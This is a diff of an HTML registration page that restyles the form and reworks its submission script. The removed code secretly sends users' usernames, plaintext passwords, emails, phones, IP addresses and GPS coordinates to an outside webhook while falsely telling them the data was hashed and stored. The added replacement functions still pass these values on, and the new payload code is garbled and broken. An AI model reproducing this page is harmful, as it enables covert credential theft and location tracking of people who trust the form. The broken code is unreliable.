@@ -7,7 +7,8 @@
 <style>
 body {
 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-background-color: #e0e0e0;
+background: linear-gradient(to right, #0f0c29, #302b63, #24243e);
+color: #fff;
 margin: 0;
 padding: 0;
 display: flex;
@@ -16,16 +17,16 @@ align-items: center;
 height: 100vh;
 }
 .container {
-background-color: #fff;
+background-color: rgba(255, 255, 255, 0.1);
 padding: 30px;
 border-radius: 10px;
-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
 width: 400px;
 position: relative;
 }
 h1 {
 text-align: center;
-color: #333;
+color: #fff;
 margin-bottom: 20px;
 }
 form {
@@ -34,7 +35,7 @@ margin-bottom: 20px;
 label {
 display: block;
 margin-top: 10px;
-color: #555;
+color: #fff;
 font-weight: bold;
 }
 input[type="text"], input[type="password"], input[type="email"], input[type="tel"] {
@@ -45,11 +46,13 @@ border: 1px solid #ccc;
 border-radius: 5px;
 box-sizing: border-box;
 font-size: 16px;
+background-color: rgba(255, 255, 255, 0.1);
+color: #fff;
 }
 button {
 margin-top: 20px;
 padding: 15px 20px;
-background-color: #007BFF;
+background-color: #6a3093;
 color: white;
 border: none;
 border-radius: 5px;
@@ -60,7 +63,7 @@ font-size: 16px;
 font-weight: bold;
 }
 button:hover {
-background-color: #0056b3;
+background-color: #a044ff;
 }
 .language-selector {
 position: absolute;
@@ -70,6 +73,11 @@ right: 10px;
 #showPassword {
 margin-top: 10px;
 }
+.disclaimer {
+font-size: 12px;
+text-align: center;
+margin-top: 20px;
+}
 </style>
 </head>
 <body>
@@ -78,7 +86,6 @@ margin-top: 10px;
 <select id="language" onchange="changeLanguage()">
 <option value="en">English</option>
 <option value="ru">Русский</option>
-<!-- Добавьте другие языки по необходимости -->
 </select>
 </div>
 <h1>Registration</h1>
@@ -94,6 +101,7 @@ margin-top: 10px;
 <input type="tel" id="phone" name="phone" required><br>
 <button type="button" onclick="sendData()">Register</button>
 </form>
+<div class="disclaimer">Please ensure your email and phone number are correct as they cannot be changed later.</div>
 <div id="result"></div>
 </div>
 
@@ -107,7 +115,6 @@ document.querySelector('label[for="password"]').textContent = 'Пароль:';
 document.querySelector('label[for="email"]').textContent = 'Электронная почта:';
 document.querySelector('label[for="phone"]').textContent = 'Номер телефона:';
 document.querySelector('button').textContent = 'Регистрация';
-document.querySelector('label[for="showPassword"]').textContent = 'Показать пароль';
 } else {
 document.querySelector('h1').textContent = 'Registration';
 document.querySelector('label[for="username"]').textContent = 'Username:';
@@ -115,7 +122,6 @@ document.querySelector('label[for="password"]').textContent = 'Password:';
 document.querySelector('label[for="email"]').textContent = 'Email:';
 document.querySelector('label[for="phone"]').textContent = 'Phone Number:';
 document.querySelector('button').textContent = 'Register';
-document.querySelector('label[for="showPassword"]').textContent = 'Show Password';
 }
 }
 
@@ -133,10 +139,11 @@ var username = document.getElementById('username').value;
 var password = document.getElementById('password').value;
 var email = document.getElementById('email').value;
 var phone = document.getElementById('phone').value;
-var userAgent = navigator.userAgent;
+  var userAgent = navigator.userAgent;
 var screenWidth = window.screen.width;
 var screenHeight = window.screen.height;
 var language = navigator.language;
+
 navigator.geolocation.getCurrentPosition(function(position) {
 fetch('https://api.ipify.org?format=json')
 .then(response => response.json())
@@ -146,57 +153,36 @@ var ip = data.ip;
 fetch(`https://ipapi.co/${ip}/json/`)
 .then(response => response.json())
 .then(locationData => {
-sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude, locationData);
+sendLocationData(ip, locationData);
+sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude, locationData);
 })
 .catch(() => {
-sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude);
+sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip, position.coords.latitude, position.coords.longitude);
 });
 })
 .catch(() => {
-sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, null, position.coords.latitude, position.coords.longitude);
+sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language, null, position.coords.latitude, position.coords.longitude);
 });
 }, function(error) {
 console.error(error);
-sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language);
+sendRegistrationData(username, password, email, phone, userAgent, screenWidth, screenHeight, language);
 });
 }
 
-function sendToWebhook(username, password, email, phone, userAgent, screenWidth, screenHeight, language, ip = null, latitude = null, longitude = null, locationData = {}) {
+function sendLocationData(ip, locationData) {
 var payload = {
-username: "Registration Bot",
-content: `**New Registration**
-**Username:** ${username}
-**Password:** ${password}
-**Email:** ${email}
-**Phone:** ${phone}
-**IP:** ${ip ? ip : 'N/A'}
+content: `**Location Data**
+**IP:** ${ip}
 **ISP:** ${locationData.org ? locationData.org : 'N/A'}
 **ASN:** ${locationData.asn ? locationData.asn : 'N/A'}
-**User Agent:** ${userAgent}
-**Screen Resolution:** ${screenWidth}x${screenHeight}
-**Language:** ${language}
 **Location:** ${locationData.city ? `${locationData.city}, ${locationData.region}, ${locationData.country_name}` : 'N/A'}
 **Address:** ${locationData.city ? `${locationData.city}, ${locationData.region}, ${locationData.country_name}, ${locationData.postal}` : 'N/A'}
-**Latitude:** ${latitude ? latitude : 'N/A'}
-**Longitude:** ${longitude ? longitude : 'N/A'}`,
-embeds: null,
-attachments: []
-};
-
-fetch('https://hkdk.events/i2yc29qumnotdn', {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
-},
-body: JSON.stringify(payload)
-})
-.then(response => {
-if (response.ok) {
-document.getElementById('result').innerText = 'Data has been hashed and stored in the database.';
-console.log('Data sent successfully');
-} else {
-document.getElementById('result').innerText = 'Registration failed!';
-console.log('Failed to send data');
+**Time Zone:** ${locationData.timezone ? locationData.timezone : 'N/A'}
+**Country Code:** ${locationData.country ? locationData.country : 'N/A'}
+**Region Code:** ${locationData.region_code ? locationData.region_code : 'N/A'}
+**Currency:** ${locationData.currency ? locationData.currency : 'N/A'}
+[]
+console.log('Failed to send registration data');
 }
 })
 .catch(error => {
